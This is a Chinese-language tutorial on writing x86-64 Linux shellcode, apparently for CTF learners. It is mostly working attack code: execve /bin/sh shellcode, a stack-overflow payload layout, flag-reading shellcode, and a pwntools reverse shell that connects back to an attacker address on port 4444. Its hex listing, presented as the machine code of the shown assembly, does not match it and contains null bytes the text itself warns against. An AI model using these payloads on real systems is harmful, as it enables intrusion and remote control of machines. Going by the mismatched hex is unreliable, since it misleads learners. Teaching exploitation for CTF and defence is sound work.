# Shellcode 基础

## 什么是 Shellcode

Shellcode 是一段可以在目标系统上执行的机器码，通常用于在漏洞利用后获取 shell 或执行其他操作。

名字来源于最初的 shellcode 用途：生成一个 shell（命令行界面）。

## 为什么需要 Shellcode

在栈溢出等漏洞利用中，我们可以控制程序的执行流程（如覆盖返回地址），但还需要告诉程序"执行什么"。Shellcode 就是我们注入的"要执行的代码"。

## x86-64 Shellcode 结构

### 最简单的 Shellcode：执行 /bin/sh

```asm
; 使用 execve 系统调用执行 /bin/sh
; execve("/bin/sh", NULL, NULL)

mov rax, 59         ; syscall number for execve
lea rdi, [rip+binsh]; rdi = 第一个参数：程序路径
xor rsi, rsi        ; rsi = 第二个参数：argv（NULL）
xor rdx, rdx        ; rdx = 第三个参数：envp（NULL）
syscall             ; 触发系统调用

binsh:
    .string "/bin/sh"
```

对应的机器码（十六进制）：
```
\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x52\x54\x5f\x52\x54\x5e\x48\x89\xe6\x48\x31\xd2\x48\xb8\x3b\x00\x00\x00\x00\x00\x00\x00\x0f\x05
```

## x86-64 系统调用约定

在 x86-64 Linux 中，系统调用通过 `syscall` 指令触发：

| 寄存器 | 用途 |
|--------|------|
| RAX | 系统调用号 |
| RDI | 第1个参数 |
| RSI | 第2个参数 |
| RDX | 第3个参数 |
| R10 | 第4个参数 |
| R8  | 第5个参数 |
| R9  | 第6个参数 |

常用系统调用号：
- `execve`: 59 (0x3b)
- `read`: 0
- `write`: 1
- `open`: 2
- `close`: 3

## 使用 pwntools 生成 Shellcode

pwntools 提供了方便的 `shellcraft` 模块：

```python
from pwn import *

# 设置架构
context.arch = 'amd64'  # 或 'i386'

# 生成执行 /bin/sh 的 shellcode
shellcode = asm(shellcraft.sh())
print(hexdump(shellcode))

# 生成读取文件的 shellcode
shellcode = asm(shellcraft.cat('/flag'))

# 生成自定义 shellcode
shellcode = asm('''
    mov rax, 59
    lea rdi, [rip+binsh]
    xor rsi, rsi
    xor rdx, rdx
    syscall
    binsh:
        .string "/bin/sh"
''')
```

## Shellcode 注入位置

### 1. 注入到栈上

```python
# Shellcode 放在缓冲区里，返回地址指向缓冲区
payload = shellcode + b'A' * (offset - len(shellcode)) + p64(buf_addr)
```

### 2. 注入到堆上

如果栈不可执行（NX保护），可能需要注入到堆上或使用 ROP。

## 常见限制和解决方案

### 1. 空字节问题（NULL bytes）

许多函数（如 `strcpy`、`gets`）在遇到 `\x00` 时会停止，所以 shellcode 中不能有空字节。

```python
# 错误：包含空字节
mov rax, 0x0  # 编码为 48 c7 c0 00 00 00 00（包含空字节！）

# 正确：使用 xor 清零
xor rax, rax  # 编码为 48 31 c0（无空字节）
```

### 2. 长度限制

如果缓冲区很小，需要写短 shellcode：

```python
# 超短 shellcode（依赖环境变量）
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())  # 约 48 字节

# 更短的版本（手写优化）
shellcode = asm('''
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    push 0x3b
    pop rax
    cdq
    syscall
''')  # 约 27 字节
```

### 3. 字符过滤

有些程序会过滤某些字符（如只允许字母数字）。这种情况需要使用编码技术（alpha-numeric shellcode）。

## 调试 Shellcode

### 用 GDB 单步执行

```bash
# 在 shellcode 入口设断点
(gdb) break *0x7fffffffde00  # shellcode 的地址

# 查看即将执行的指令
(gdb) x/10i $rip

# 单步执行
(gdb) si  # step instruction

# 查看寄存器
(gdb) info registers

# 查看系统调用
(gdb) catch syscall
(gdb) continue
```

### 验证 Shellcode

```python
# 独立测试 shellcode
from pwn import *

context.arch = 'amd64'
shellcode = asm(shellcraft.sh())

# 写入临时文件
with open('/tmp/test_shellcode', 'wb') as f:
    f.write(shellcode)

# 使用 strace 查看系统调用
os.system('chmod +x /tmp/test_shellcode')
os.system('strace /tmp/test_shellcode')
```

## Shellcode 模板

### 读取 Flag 文件

```python
from pwn import *
context.arch = 'amd64'

# 方法1：使用 shellcraft
shellcode = asm(shellcraft.cat('/flag'))

# 方法2：手写
shellcode = asm('''
    /* open("/flag", O_RDONLY) */
    push 0
    mov rax, 0x67616c662f  /* "/flag" in little-endian */
    push rax
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2
    syscall

    /* read(fd, buf, 100) */
    mov rdi, rax
    lea rsi, [rsp-100]
    mov rdx, 100
    xor rax, rax
    syscall

    /* write(1, buf, 100) */
    mov rdi, 1
    mov rax, 1
    syscall
''')
```

### 反向 Shell

```python
# 连接回攻击者机器
shellcode = asm(shellcraft.connect('192.168.1.100', 4444))
shellcode += asm(shellcraft.dupsh())
```

## 总结

编写 Shellcode 的关键点：
1. 理解系统调用约定（寄存器如何传参）
2. 避免空字节（使用 xor 代替 mov 0）
3. 尽量缩短长度（如果空间有限）
4. 使用 pwntools 的 shellcraft 加速开发
5. 用 GDB 调试验证 shellcode 正确性

Shellcode 是漏洞利用的核心组件，掌握好它是进阶的基础！
